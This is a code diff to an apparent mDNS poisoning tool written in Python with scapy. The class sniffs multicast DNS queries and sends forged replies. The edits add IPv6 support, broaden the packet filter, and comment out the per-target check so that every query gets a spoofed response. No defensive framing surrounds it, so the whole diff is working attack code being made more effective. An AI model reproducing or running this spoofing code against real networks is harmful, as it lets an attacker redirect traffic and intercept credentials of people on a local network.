@@ -44,8 +44,8 @@ class MDNS(PoisonNetworkInfo):
                 return
             response /= IP(dst=pkt[IP].src)
             ip_of_the_packet = pkt[IP].src
-        if IPv6 in pkt:
-            if pkt[IP].src == self.ipv6:
+        elif IPv6 in pkt:
+            if pkt[IPv6].src == self.ipv6:
                 return
             response /= IPv6(dst=pkt[IPv6].src)
             ip_of_the_packet = pkt[IPv6].src
@@ -75,14 +75,17 @@ class MDNS(PoisonNetworkInfo):
         return response
 
     def send_packet(self, response: packet, ip_of_the_packet: str) -> None:
-        if ip_of_the_packet not in self.targets_used:
-            print("Sending packet to " + ip_of_the_packet)
-            response.show()
-            sendp(response, verbose=False)
-            self.targets_used.append(ip_of_the_packet)
+        # if ip_of_the_packet not in self.targets_used:
+        print("Sending packet to " + ip_of_the_packet)
+        sendp(response, verbose=False)
+        self.targets_used.append(ip_of_the_packet)
 
     def filter_for_mdns(self, pkt: packet) -> bool:
-        return pkt.haslayer(DNS) and pkt.haslayer(IP) and pkt[DNS].qd is not None
+        return (
+            pkt.haslayer(DNS)
+            and (pkt.haslayer(IP) or pkt.haslayer(IPv6))
+            and pkt[DNS].qd is not None
+        )
 
     def mdns_checking_packets(self, pkt: packet) -> None:
         if self.filter_for_mdns(pkt):
@@ -95,7 +98,6 @@ class MDNS(PoisonNetworkInfo):
     def start_mdns_poisoning(self) -> None:
         # Port of mdns 5353
         # filter="udp and port mdns",
-        print("Starting MDNSPoisoner...")
         sniff(
             filter="udp and port mdns",
             iface=self.iface,
